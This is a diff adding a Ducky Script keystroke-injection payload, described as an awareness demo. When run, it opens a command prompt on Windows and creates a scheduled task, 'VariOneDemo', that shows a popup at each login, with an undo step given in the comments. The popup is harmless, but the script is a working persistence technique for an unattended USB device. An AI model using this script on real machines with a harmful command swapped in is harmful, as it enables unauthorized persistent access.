@@ -1,0 +1,16 @@
+REM VariOne Demo — simulated persistence (awareness demo only)
+REM Adds a scheduled task that shows a popup every login.
+REM Target: Windows. Requires no elevation on most configs.
+REM Undo: Task Scheduler → "VariOneDemo" → Delete.
+
+DELAY 2000
+GUI r
+DELAY 600
+STRING cmd
+ENTER
+DELAY 800
+STRING schtasks /create /tn "VariOneDemo" /tr "msg * VariOne was here" /sc onlogon /f
+ENTER
+DELAY 500
+STRING echo [DEMO] Persistence task created. Check Task Scheduler.
+ENTER
